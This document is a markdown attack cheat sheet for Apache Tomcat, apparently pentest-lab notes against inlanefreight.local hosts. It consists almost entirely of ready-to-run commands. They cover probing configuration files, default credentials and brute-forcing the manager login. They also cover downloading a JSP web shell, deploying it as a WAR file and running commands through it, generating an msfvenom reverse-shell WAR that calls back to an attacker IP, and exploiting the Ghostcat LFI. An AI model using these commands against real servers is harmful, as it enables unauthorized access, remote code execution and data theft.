# tomcat
## version detection
http://app-dev.inlanefreight.local:8080/invalid        (invalid request)  
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat  
## interesting locations
curl -s http://app-dev.inlanefreight.local:8080/conf/  
curl -s http://app-dev.inlanefreight.local:8080/conf/tomcat-users.xml  
curl -s http://app-dev.inlanefreight.local:8080/conf/tomcat-users.xsd  
curl -s http://app-dev.inlanefreight.local:8080/lib/  
curl -s http://app-dev.inlanefreight.local:8080/logs/  
curl -s http://app-dev.inlanefreight.local:8080/temp/  
curl -s http://app-dev.inlanefreight.local:8080/webapps/random_app1/WEB-INF/web.xml  
curl -s http://app-dev.inlanefreight.local:8080/webapps/random_app1/WEB-INF/classes  
## main urls for tomcat manager
curl -s http://app-dev.inlanefreight.local:8080/manager/  
curl -s http://app-dev.inlanefreight.local:8080/host-manager/  
## default credentials
tomcat:tomcat  
admin:admin  
## tomcat manager login bruteforcing
### metasploit
msf> auxiliary/scanner/http/tomcat_mgr_login  
### python script
https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce  
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt  
### tomcat wordlists
* user list
  * /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
* pass list
  * /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
## tomcat manager - WAR file upload (/manager/html)
* example jsp rce payload
  * wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
* convert .jsp to .war
  * zip -r payload.war cmd.jsp
* tomcat manager upload
  * 'WAR file to deploy' section
  * Browse (choose .war file)
  * Deploy
* choose 'payload' from the 'Applications'
* load web shell in browser
  * firefox> http://web01.inlanefreight.local:8180/payload/cmd.jsp
* call web shell through curl
  * curl http://web01.inlanefreight.local:8180/payload/cmd.jsp?cmd=id
## generating war web shell with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war  
## uploading war file with metasploit
msf> exploit/multi/http/tomcat_mgr_upload  
## CVE-2020-1938 : Ghostcat vulnerability
### info
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938  
Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named Ghostcat.  
All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable.  
This vulnerability was caused by a misconfiguration in the AJP (Apache Jserv Protocol) protocol used by Tomcat.  
AJP port: 8009
### exploitation
nmap -sV -p 8009 app-dev.inlanefreight.local  
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi  
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml  
